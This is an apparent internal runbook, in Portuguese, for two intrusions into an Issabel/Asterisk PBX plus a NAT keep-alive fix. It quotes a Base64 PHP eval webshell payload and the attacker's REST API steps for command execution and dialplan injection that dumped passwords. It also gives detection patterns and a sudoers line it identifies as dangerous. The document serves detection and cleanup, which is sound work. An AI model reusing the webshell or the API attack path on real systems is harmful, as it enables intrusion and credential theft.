# Incidente tipo Couro Nobre (02/11/2026): injeção no dialplan e queda de NAT nos ramais

Dois problemas independentes que juntos faziam o ramal 200 (DECT Grandstream DP752/DP722, atrás de NAT) não receber chamadas.

## A. Injeção maliciosa no dialplan (invasão pelo painel web)
**Sintomas:** chamada para um ramal cai na hora com `SIP/2.0 603 Decline`/UNKNOWN antes de discar; o log mostra o contexto `injection-1` (arquivo `extensions_additional.conf`).
**Causa:** regra criada no módulo de injeções do PBX (ex.: `(200) s559368`) com payload Base64 `PD9waHAgQGV2YWwoJF9QT1NUWzBdKTs/Pg==` = `<?php @eval($_POST[0]);?>` (tentativa de criar webshell PHP). Entrou por falha de RCE do `issabel-framework` antigo.
**Detecção automática:** o Sentinel (`ipbx-sentinel`, a cada minuto) alerta no Telegram quando o dialplan tem `[injection-N]`, `PD9waHA`, `eval(` ou `System()/Shell()` com curl/wget/base64 (`check_dialplan_injection`). Só alerta, não apaga. A auditoria (`ipbx-sentinel --audit`, seção 9) lista os mesmos achados. Teste: `ipbx-sentinel --selftest`.
**Correção (técnico):**
1. Remover a regra no módulo de injeções do painel clássico e recarregar a configuração do Asterisk.
2. Conferir: `grep -nE '^\[injection-|PD9waHA|eval *\(' /etc/asterisk/extensions*.conf` (sem resultado = limpo).
3. Procurar arquivos PHP novos/estranhos: `ipbx-sentinel --scan` (quarentena reversível, `--list`/`--restore`) e `find /var/www/html -name '*.php' -mtime -3`.
4. Atualizar o framework se pendente: `ipbx-sentinel --update-framework` (faz snapshot antes). `issabel-framework` 5.0.0-5 ou maior já está corrigido (aviso oficial de 02/08/2026: vulneráveis ≤ 4.0.0-12 / ≤ 5.0.0-3).
5. Trocar senhas de administração (painel e banco).
**Não fazemos:** restringir as portas 80/443 por IP (regra do projeto: o acesso ao PABX, por domínio ou por IP direto, nunca é restringido). A defesa é atualizar, fail2ban, alertas e quarentena.

## B. Queda de NAT (porta UDP fechada no roteador do cliente)
**Sintomas:** o ramal origina chamadas, mas as entrantes falham em período ocioso ("indisponível").
**Causa:** sem pacotes de manutenção, o roteador do cliente fecha o mapeamento UDP; o PABX não alcança o aparelho.
**Ajustes aplicados (manuais, por aparelho/ramal):**
| Onde | Parâmetro | Valor |
|---|---|---|
| Servidor SIP (GDMS/aparelho) | NAT Traversal | Keep-Alive |
| Base DP752 | Keep-Alive Interval | 20 s |
| Perfil SIP do aparelho | Register Expiration | 2 min |
| Issabel (extensões PJSIP) | `qualifyfreq` | 25 s |
Também: limpar contatos órfãos de um ramal com `asterisk -rx "database deltree registrar/contact/200"` (troque 200 pelo ramal) e confirmar um único registro estável (`pjsip show contacts`).
**Pendente de automatizar:** auditoria/ajuste de `qualifyfreq` e detecção de ramais que ficam "Indisponível" de forma intermitente (hoje o painel só mostra o estado).

## A2. Segundo incidente Couro Nobre (26/11/2026): invasão pela API REST `/pbxapi/`
**Como foi:** login válido na API (`POST/GET /pbxapi/authenticate`, senha do admin provavelmente roubada em 02/11 e não trocada), depois `GET /pbxapi/manager/originate?application=System` (execução de comando: criou webshell `PBX.php` e `drop_*.txt` com o `amportal.conf`) e `POST /pbxapi/dialplaninjection` (regras `[injection-N]` que gravam senhas e dump do banco em `/var/www/html/zt9loot.txt`, baixado de fora). Ferramenta automática (`Python-urllib`) trocando de IP a cada requisição, então fail2ban e firewall (80/443 abertas) não pegam.
**Defesa entregue:** (1) `instalar-front-api.sh` cria `/etc/httpd/conf.d/ipbx-pbxapi.conf` (`/pbxapi` só responde ao próprio servidor; não restringe o painel nem o acesso por IP); opt-out: `/etc/ipbx/pbxapi-externo.liberado`. (2) Sentinel: `check_pbxapi_abuse` (IP externo com 2xx em `/pbxapi/manager|dialplaninjection`), `check_web_dumps` (arquivo com senhas na pasta web: alerta e tranca com `chmod 000`), `check_dialplan_module` (módulo Dialplan Injection instalado) e leitura dos logs por domínio (`*_access.log`).
**Limpeza (técnico):** `DELETE FROM dialplaninjection_commands; DELETE FROM dialplaninjection_dialplaninjections;` no banco `asterisk`, `/var/lib/asterisk/bin/retrieve_conf && asterisk -rx "dialplan reload"`, apagar `zt9loot.txt`/`drop_*.txt`/`PBX.php`, desinstalar o módulo e **trocar todas as senhas** (admin, root, MySQL, AMI, Cyrus, troncos, ramais).
**Sudo (lição do incidente):** nosso `install.sh`/`ipbx-menu.sh` criavam `/etc/sudoers.d/asterisk` com `asterisk ALL=(ALL) NOPASSWD: ALL`, e os comandos do invasor rodavam como `asterisk` (= root). O painel não precisa disso: `retrieve_conf` e `asterisk -rx` rodam como o próprio `asterisk` (testado no couronobre: retrieve_conf código 0 em 0,9 s). Agora os instaladores não criam a linha e `instalar-front-api.sh` remove-a (só se for exatamente essa linha, com cópia em `/var/backup/ipbx/sudoers-asterisk.*`; nunca toca `/etc/sudoers.d/issabel`). Em Issabel 5 `/usr/sbin/fwconsole` é uma pasta, não um programa: o código cai no `asterisk -rx "core reload"`.
